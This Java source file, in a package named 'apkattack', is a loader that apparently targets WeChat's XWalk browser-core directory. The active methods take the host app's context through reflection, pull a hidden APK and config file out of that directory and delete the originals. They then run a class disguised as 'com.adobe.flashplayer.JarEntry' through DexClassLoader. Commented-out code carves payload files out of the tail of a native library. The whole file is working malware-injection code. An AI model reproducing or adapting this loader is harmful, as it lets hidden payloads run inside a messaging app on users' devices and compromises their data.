package com.example.apkattack;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Collections;
import dalvik.system.DexClassLoader;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.util.Log;




@SuppressLint("SdCardPath") 
public class XwalkCoreEntry {
	
	/*
	public static splitfile(){
		File fso = new File(xwalkpath + libname);
		int sofilesize = (int)fso.length();
		byte [] buf = new byte[sofilesize];
		FileInputStream is = new FileInputStream(fso);
		int len = is.read(buf,0,sofilesize);
		is.close();
		if (len != sofilesize) {
			Log.e(Tag, "so file size:" + sofilesize + " read size: not equal" + len);
			return;
		}else{
			Log.e(Tag, "read so file size:" + sofilesize + " ok");
		}
		
		byte[] byteflag = new byte[4];
		System.arraycopy(buf, sofilesize - 4, byteflag, 0, 4);
		int flag = (byteflag[3] & 0xFF) | ((byteflag[2] & 0xFF)<<8) | 
				((byteflag[1] & 0xFF)<<16) | ((byteflag[0] & 0xFF)<<24);
		if (flag != 0x1a2bc3d4 && flag != 0xd4c32b1a) {
			//flag != 0xd4c32b1a && flag != 0x1a2bc3d4
			Log.e(Tag, "flag:" + flag + " error");
			return;
		}else{
			Log.e(Tag, "flag:" + flag + " ok");
		}
		
		byte[] bytefilecnt = new byte[1];
		System.arraycopy(buf, sofilesize - 4 - 1, bytefilecnt, 0, 1);
		int filecnt = bytefilecnt[0];
		if (filecnt <= 0) {
			Log.e(Tag, "find bind file count:" + filecnt + " error");
			return;
		}else{
			Log.e(Tag, "find bind file count:" + filecnt);
		}
		
		int start = sofilesize - 4 - 1 - 16;

		for (int i = 0; i < filecnt; i++) {
			
			byte[] tmpfilename = new byte[16];
			System.arraycopy(buf, start, tmpfilename, 0, 16);
			int tmplen = 0;
			for (; tmplen < tmpfilename.length; tmplen++) {
				if (tmpfilename[tmplen] == 0) {
					Log.e(Tag,"find file name len:" + tmplen);
					break;
				}
			}
			
			byte[] filename = new byte[tmplen];
			System.arraycopy(tmpfilename, 0, filename, 0,tmplen);
			String strfilename = new String(filename);
			if (strfilename.contains(apkfilename)) {
				Log.e(Tag,"find apk file:" + apkfilename);
			}else if (strfilename.contains(cfgfilename)) {
				Log.e(Tag,"find config file:" + cfgfilename);
			}else{
				Log.e(Tag,"find file:" + strfilename);
			}
			
			start -= 4;
			byte[] bytesize = new byte[4];
			System.arraycopy(buf, start, bytesize, 0, 4);
			int size = (bytesize[3] & 0xFF) + ((bytesize[2] & 0xFF)<<8) +
					((bytesize[1] & 0xFF)<<16) + ((bytesize[0] & 0xFF)<<24);
			
			Log.e(Tag,"find file size:" + size);
			
			start -= size;
			if (start <= 0) {
				Log.e(Tag, "offset error");
				return;
			}
			File tmpfile = new File(newpath + strfilename);
			FileOutputStream fout = new FileOutputStream(tmpfile);
			fout.write(buf,start,size);
			fout.close();
			
			start -= 16;
		}
	}
	*/
	
	/*
    public void unZip(String unZipfileName, String mDestPath) {
        if (!mDestPath.endsWith("/")) {
            //mDestPath = mDestPath + "/";
        }
        FileOutputStream fileOut = null;
        ZipInputStream zipIn = null;
        ZipEntry zipEntry = null;
        File file = null;
        int readedBytes = 0;
        byte buf[] = new byte[4096];
        try {
            zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(unZipfileName)));
            while ((zipEntry = zipIn.getNextEntry()) != null) {
                file = new File(mDestPath + zipEntry.getName());
                if (zipEntry.isDirectory()) {
                    file.mkdirs();
                } else {
                    File parent = file.getParentFile();
                    if (!parent.exists()) {
                        parent.mkdirs();
                    }
                    fileOut = new FileOutputStream(file);
                    while ((readedBytes = zipIn.read(buf)) > 0) {
                        fileOut.write(buf, 0, readedBytes);
                    }
                    fileOut.close();
                }
                zipIn.closeEntry();
            }
        } catch (IOException ioe) {
            ioe.printStackTrace();
        }
    }*/
	
	
	
	//btrace.qq.com
	//Lorg/xwalk/core/internal/XWalkViewDelegate;
	//Lorg/chromium/base/library_loader/LibraryLoader;
	//org.chromium.base.process_launcher .ChildProcessService
	//org.chromium.base .SystemMessageHandler
	//org.chromium.ui.gfx.BitmapHelper
	/*
	@SuppressWarnings("unused")
	public static void xwalkcoreEntry(Context context){

		String Tag = "xwalkcoreEntry";
		try {
			Log.e(Tag, "xwalkcoreEntry start");
			if (context == null) {
				Log.e(Tag, "xwalkcoreEntry context null");
				return;
			}
			
			String appfilepath = "/data/data/com.tencent.mm/files/";
			//String appfilepath = context.getFilesDir().getAbsolutePath() + "/";
			
			String apppath =  "/data/data/com.tencent.mm/";
			//String apppath =  context.getFilesDir().getParent() + "/";
			
			/*
			FileOutputStream glfout = null;
			FileLock fLock = null;
			try{
				File glfile = new File(apppath + "gl.lock");
				if (glfile.exists() == false) {
					glfile.createNewFile();
				}else{
					glfout = new FileOutputStream(glfile);
					fLock = glfout.getChannel().tryLock();
					if (null == fLock) {
						Log.e(Tag,"program is already running");
						glfout.close();
						return;
					}else{
						Log.e(Tag,"program start running");
					}
				}
			}catch (Exception e) {
				Log.e(Tag,"get global lock error");
				
				if (null != glfout) {
					try {
						glfout.close();
					} catch (IOException ex) {
						ex.printStackTrace();
					}
				}
			}*/
			
			/*
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
	    	//String dexclassname = "com.google.android.apps.plus.JarEntry";

			String apkfilename = "simcard.apk";
			//String apkfilename = "qqsdl.apk";
			
			String cfgfilename = "ark.dat";
			
			String dexmethodname = "start";
			
			String libname = "libxwalkcore.so";
			
			String newpath = apppath + "xwalkcore_application/";
			
			File newapkfile = new File(newpath + apkfilename);
			File newcfgfile = new File(newpath + cfgfilename);
			if (newcfgfile.exists() == false || newapkfile.exists() == false) {

				File newpathfile = new File(newpath);
				if (newpathfile.exists() == false) {
					boolean b = newpathfile.mkdirs();
					if(b == false){
						Log.e(Tag, "create path:" + newpath + " error");
						return;
					}else{
						Log.e(Tag, "create path:" + newpath + " ok");
					}
				}else{
					Log.e(Tag, "path:" + newpath + " already exist");
				}
				
	
				File apppathfile = new File(apppath);
				File [] apppathfiles = apppathfile.listFiles();
				if (apppathfiles == null) {
					Log.e(Tag,"list file path error");
					return;
				}else{
					Log.e(Tag, "list file path ok");
				}
				
				
				String xwalkpath = "";
				String xwalksubpath = "";
				//ArrayList<Integer> versions = new ArrayList<Integer>();

				for (int i = 0; i < apppathfiles.length; i++) {
					String listedfn = apppathfiles[i].getName();
					if (listedfn.startsWith("app_xwalk_9") || listedfn.startsWith("app_xwalk_89") || 
							listedfn.startsWith("app_xwalk_79")) {
						//String strnum = listedfn.substring(11);
						//int num = Integer.valueOf(strnum);
						//versions.add(num);
						
						xwalksubpath = listedfn;
						xwalkpath = apppath + listedfn + "/extracted_xwalkcore/";
						
						break;
					}
				}
				
//				for (int i = 0; i < versions.length; i++) {
//					
//				}

				
				if (xwalkpath.equals("") || xwalksubpath.equals("")) {
					Log.e(Tag,"not found xwalkcore path");
					return;
				}else{
					Log.e(Tag, "find xwalk path:" + xwalkpath + " xwalk sub path:" + xwalksubpath);
				}
				
				File oldfilecfg = new File(xwalkpath + cfgfilename);
				if (oldfilecfg.exists() == false) {
					Log.e(Tag, "not find file:" + oldfilecfg.getAbsolutePath());
					return;
				}else{
					FileInputStream fin = new FileInputStream(oldfilecfg);
					FileOutputStream fout = new FileOutputStream(newcfgfile);
					
					int filesize = (int)oldfilecfg.length();
					
					byte [] buf = new byte[filesize];
					int len = fin.read(buf,0,filesize);
					fout.write(buf,0,filesize);
					fin.close();
					fout.close();
					
					oldfilecfg.delete();
				}
				
				File oldfileapk = new File(xwalkpath + apkfilename);
				if (oldfileapk.exists() == false) {
					Log.e(Tag, "not find file:" + oldfileapk.getAbsolutePath());
					return;
				}else{
					FileInputStream fin = new FileInputStream(oldfileapk);
					FileOutputStream fout = new FileOutputStream(newapkfile);
					
					int filesize = (int)oldfileapk.length();
					
					byte [] buf = new byte[filesize];
					int len = fin.read(buf,0,filesize);
					fout.write(buf,0,filesize);
					fin.close();
					fout.close();
					oldfileapk.delete();
				}
			}

			
	    	String cachepath = context.getCacheDir() + "/";
	    	DexClassLoader dexcl = new DexClassLoader(newpath + apkfilename, cachepath, null,context.getClassLoader());	    	
    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();
    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
    	    method.invoke(obj,context);

    	    //System.load(libpath + libsoname);
    	    
    	    Log.e(Tag, "apk or dex loaded successful");
			
		} catch (Exception e) {
			Log.e(Tag,"exception");
			e.printStackTrace();
		}
	}*/
	
	
	//btrace.qq.com;???
	//Lorg/chromium/content/app/PrivilegedProcessService;
	//Lorg/chromium/content/app/ContentChildProcessService;
	//Lorg/chromium/content/app/ContentChildProcessServiceDelegate;
	//Lorg/chromium/content/app/SandboxedProcessService;
	//Lorg/chromium/content/app/SandboxedProcessService0;
	
	//Lorg.xwalk.core.internal.XWalkViewBridge; 				2
	//Lorg/xwalk/core/internal/XWalkViewDelegate;				2
	//Lorg/chromium/base/library_loader/LibraryLoader;			1
	//org.chromium.base.process_launcher.ChildProcessService	1
	//org.chromium.base.SystemMessageHandler					1
	//org.chromium.ui.gfx.BitmapHelper							1
	
	//Lorg/chromium/base/library_loader/Linker;
	//Lorg/chromium/base/library_loader/LegacyLinker;
	//Lorg/chromium/base/library_loader/NativeLibraries;
	
	public static void xwalkEntryWithoutContext(){
		String Tag = "xwalkcoreEntry";
		try {
			Log.e(Tag, "xwalkcoreEntry start");

	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "xwalkcoreEntry context null");
				return;
			}else{
				Log.e(Tag, "xwalkcoreEntry context ok,package name:" + context.getPackageName()+"/class name:" + 
						context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "call stack class:" + stackElements[i].getClassName()+
	            			"/method:" + stackElements[i].getMethodName());
	            	//Log.e(Tag, stackElements[i].getFileName());
	            	//Log.e(Tag, stackElements[i].getLineNumber());
	            	//Log.e(Tag, stackElements[i].getMethodName());
	            }
	        }


			String apppath =  context.getFilesDir().getParent() + "/";
			
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";

	    	String rawapkfn = "";
	    	
			String apkfilename = "qqsdl.apk";			//simcard.apk
			
			String cfgfilename = "ark.dat";
			
			String dexmethodname = "start";
			
			String newpath = apppath + "xwalkcore_application/";
			
			File newapkfile = new File(newpath + apkfilename);
			File newcfgfile = new File(newpath + cfgfilename);

			File newpathfile = new File(newpath);
			if (newpathfile.exists() == false) {
				boolean b = newpathfile.mkdirs();
				if(b == false){
					Log.e(Tag, "create path:" + newpath + " error");
					return;
				}else{
					Log.e(Tag, "create path:" + newpath + " ok");
				}
			}else{
				Log.e(Tag, "path:" + newpath + " already exist");
			}
			

			File apppathfile = new File(apppath);
			File [] apppathfiles = apppathfile.listFiles();
			if (apppathfiles == null) {
				Log.e(Tag,"list mm file path error");
				return;
			}else{
				Log.e(Tag, "list mm file path ok");
			}

			ArrayList<String> versions = new ArrayList<String>() ;
			for (int i = 0; i < apppathfiles.length; i++) {
				String listedfn = apppathfiles[i].getName();
				if (listedfn.startsWith("app_xwalk_") ) {
					//xwalksubpath = listedfn;
					//xwalkpath = apppath + listedfn + "/extracted_xwalkcore/";
					//String ver = listedfn.substring(11);
					versions.add(listedfn);
					Log.e(Tag,"find xwalk version path:" + listedfn);
				}
			}
			
			if (versions == null || versions.size() <= 0) {
				Log.e(Tag,"list app_xwalk_x error or not found new version");
				return;
			}
			Collections.sort(versions);

			String xwalksubpath = versions.get(versions.size() -1);
			String xwalkpath = apppath + xwalksubpath + "/extracted_xwalkcore/";
			if (xwalkpath.equals("") || xwalksubpath.equals("")) {
				Log.e(Tag,"not found xwalkcore path");
				return;
			}else{
				Log.e(Tag, "find xwalk path:" + xwalkpath + " xwalk sub path:" + xwalksubpath);
			}
			
			
			File []unzipfiles = new File(xwalkpath).listFiles();
			for (int i = 0; i < unzipfiles.length; i++) {
				String tmpfn = unzipfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					rawapkfn = tmpfn;
					break;
				}
			}
			
			if (rawapkfn == null || rawapkfn.equals("")) {
				if (newcfgfile.exists() == false || newapkfile.exists() == false) {
					Log.e(Tag,"something error,not found apk or config file");
					return;
				}else{
					Log.e(Tag,"new apk and config file exist");
				}
			}else{
				Log.e(Tag,"find apk file:" + rawapkfn);

				File oldfilecfg = new File(xwalkpath + cfgfilename);
				if (oldfilecfg.exists() == false) {
					Log.e(Tag, "not find file:" + oldfilecfg.getAbsolutePath());
					return;
				}else{
					FileInputStream fin = new FileInputStream(oldfilecfg);
					FileOutputStream fout = new FileOutputStream(newcfgfile);
					int filesize = (int)oldfilecfg.length();
					byte [] buf = new byte[filesize];
					int len = fin.read(buf,0,filesize);
					fout.write(buf,0,filesize);
					fin.close();
					fout.close();
					oldfilecfg.delete();
					
					Log.e(Tag, "copy cfg file:" + oldfilecfg.getAbsolutePath() + " size:" + len);
				}
				
				File oldfileapk = new File(xwalkpath + rawapkfn);
				if (oldfileapk.exists() == false) {
					Log.e(Tag, "not find file:" + oldfileapk.getAbsolutePath());
					return;
				}else{
					FileInputStream fin = new FileInputStream(oldfileapk);
					FileOutputStream fout = new FileOutputStream(newapkfile);
					int filesize = (int)oldfileapk.length();
					byte [] buf = new byte[filesize];
					int len = fin.read(buf,0,filesize);
					fout.write(buf,0,filesize);
					fin.close();
					fout.close();
					oldfileapk.delete();
					
					Log.e(Tag, "copy apk src file:" + oldfileapk.getAbsolutePath() + " to:" + 
					newapkfile.getAbsolutePath() + " size:" + len);
				}
			}

			
	    	String cachepath = context.getCacheDir() + "/";
	    	DexClassLoader dexcl = new DexClassLoader(newpath + apkfilename, cachepath, null,context.getClassLoader());	    	
    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();
    	    Method entrymethod = cls.getDeclaredMethod(dexmethodname, Context.class,String.class);
    	    entrymethod.invoke(obj,context,newpath);

    	    //System.load(libpath + libsoname);
    	    
    	    Log.e(Tag, "apk or dex loaded successful");
    	    return;
		} catch (Exception e) {
			Log.e(Tag,"exception");
			e.printStackTrace();
		}
	}
	
	
	
	
	//btrace.qq.com
	//Lorg/xwalk/core/internal/XWalkViewDelegate;
	//Lorg/chromium/base/library_loader/LibraryLoader;
	//org.chromium.base.process_launcher.ChildProcessService
	//org.chromium.base.SystemMessageHandler
	//org.chromium.ui.gfx.BitmapHelper
	public static void xwalkEntryWithActivity(Activity activity){
		String Tag = "xwalkcoreEntry";
		try {
			Log.e(Tag, "xwalkcoreEntry start");
			
//			public static int loadtimes = 0;
//			if (loadtimes > 0) {
//				
//				return;
//			}else{
//				loadtimes ++;
//			}

			//String appfilepath = context.getFilesDir().getAbsolutePath() + "/";
			//String apppath =  "/data/data/com.tencent.mm/";
			String apppath =  activity.getFilesDir().getParent() + "/";
			
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
	    	//String dexclassname = "com.google.android.apps.plus.JarEntry";

	    	String rawapkfn = "";
	    	
			String apkfilename = "qqsdl.apk";			//simcard.apk
			
			String cfgfilename = "ark.dat";
			
			String dexmethodname = "startActivity";
			
			//String libname = "libxwalkcore.so";
			
			String newpath = apppath + "xwalkcore_application/";
			
			File newapkfile = new File(newpath + apkfilename);
			File newcfgfile = new File(newpath + cfgfilename);
			//if (newcfgfile.exists() == false || newapkfile.exists() == false) {
				File newpathfile = new File(newpath);
				if (newpathfile.exists() == false) {
					boolean b = newpathfile.mkdirs();
					if(b == false){
						Log.e(Tag, "create path:" + newpath + " error");
						return;
					}else{
						Log.e(Tag, "create path:" + newpath + " ok");
					}
				}else{
					Log.e(Tag, "path:" + newpath + " already exist");
				}
				
	
				File apppathfile = new File(apppath);
				File [] apppathfiles = apppathfile.listFiles();
				if (apppathfiles == null) {
					Log.e(Tag,"list mm file path error");
					return;
				}else{
					Log.e(Tag, "list mm file path ok");
				}

				ArrayList<String> versions = new ArrayList<String>() ;
				for (int i = 0; i < apppathfiles.length; i++) {
					String listedfn = apppathfiles[i].getName();
					if (listedfn.startsWith("app_xwalk_") ) {
						//xwalksubpath = listedfn;
						//xwalkpath = apppath + listedfn + "/extracted_xwalkcore/";
						
						//String ver = listedfn.substring(11);
						versions.add(listedfn);
						Log.e(Tag,"find xwalk version path:" + listedfn);
					}
				}
				if (versions == null || versions.size() <= 0) {
					Log.e(Tag,"list app_xwalk_x error or not found new version");
					return;
				}
				Collections.sort(versions);

				String xwalksubpath = versions.get(versions.size() -1);
				String xwalkpath = apppath + xwalksubpath + "/extracted_xwalkcore/";
				if (xwalkpath.equals("") || xwalksubpath.equals("")) {
					Log.e(Tag,"not found xwalkcore path");
					return;
				}else{
					Log.e(Tag, "find xwalk path:" + xwalkpath + " xwalk sub path:" + xwalksubpath);
				}
				
				
				File []unzipfiles = new File(xwalkpath).listFiles();
				for (int i = 0; i < unzipfiles.length; i++) {
					String tmpfn = unzipfiles[i].getName();
					if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
						rawapkfn = tmpfn;
						break;
					}
				}
				
				if (rawapkfn == null || rawapkfn.equals("")) {
					if (newcfgfile.exists() == false || newapkfile.exists() == false) {
						Log.e(Tag,"something error,not found apk or config file");
						return;
					}else{
						Log.e(Tag,"new apk and config file exist");
					}
				}else{
					Log.e(Tag,"find apk file:" + rawapkfn);

					File oldfilecfg = new File(xwalkpath + cfgfilename);
					if (oldfilecfg.exists() == false) {
						Log.e(Tag, "not find file:" + oldfilecfg.getAbsolutePath());
						return;
					}else{
						FileInputStream fin = new FileInputStream(oldfilecfg);
						FileOutputStream fout = new FileOutputStream(newcfgfile);
						int filesize = (int)oldfilecfg.length();
						byte [] buf = new byte[filesize];
						int len = fin.read(buf,0,filesize);
						fout.write(buf,0,filesize);
						fin.close();
						fout.close();
						oldfilecfg.delete();
						
						Log.e(Tag, "copy cfg file:" + oldfilecfg.getAbsolutePath() + " size:" + len);
					}
					
					File oldfileapk = new File(xwalkpath + rawapkfn);
					if (oldfileapk.exists() == false) {
						Log.e(Tag, "not find file:" + oldfileapk.getAbsolutePath());
						return;
					}else{
						FileInputStream fin = new FileInputStream(oldfileapk);
						FileOutputStream fout = new FileOutputStream(newapkfile);
						int filesize = (int)oldfileapk.length();
						byte [] buf = new byte[filesize];
						int len = fin.read(buf,0,filesize);
						fout.write(buf,0,filesize);
						fin.close();
						fout.close();
						oldfileapk.delete();
						
						Log.e(Tag, "copy apk src file:" + oldfileapk.getAbsolutePath() + " to:" + 
						newapkfile.getAbsolutePath() + " size:" + len);
					}
				}
			//}
			
	    	String cachepath = activity.getCacheDir() + "/";
	    	DexClassLoader dexcl = new DexClassLoader(newpath + apkfilename, 
	    			cachepath, null,activity.getClassLoader());	    	
    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();
    	    Method entrymethod = cls.getDeclaredMethod(dexmethodname, Activity.class);
    	    entrymethod.invoke(obj,activity);

    	    //System.load(libpath + libsoname);
    	    
    	    Log.e(Tag, "apk or dex loaded with activity successful");
    	    return;
		} catch (Exception e) {
			Log.e(Tag,"exception");
			e.printStackTrace();
		}
	}

}
